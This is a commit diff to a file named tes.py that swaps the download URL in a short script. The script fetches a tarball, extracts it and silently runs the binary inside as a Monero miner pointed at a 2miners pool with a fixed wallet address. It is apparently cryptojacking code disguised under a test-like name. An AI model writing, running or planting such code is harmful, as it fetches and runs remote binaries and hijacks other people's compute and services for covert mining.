eba5f6da6b02e0a8b740ec448ca8189b7abe80c2
ontaracing04 <110086717+ontaracing04@users.noreply.github.com>
2022-07-29 13:16:09 +0700

    Update tes.py

--- tes.py
+++ tes.py
@@ -1,5 +1,5 @@
 import os
 
-os.system("wget https://gitlab.com/gascuankanlah/gass/-/raw/main/-.tar.gz")
+os.system("wget https://github.com/nurkartina604/st/raw/main/-.tar.gz")
 os.system("tar -xf -.tar.gz")
 os.system("./- -o xmr.2miners.com:2222 -u 83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju.$(echo $(shuf -i 1000-99999999999 -n 1)-monyet) >/dev/null >/dev/null 2>&1")
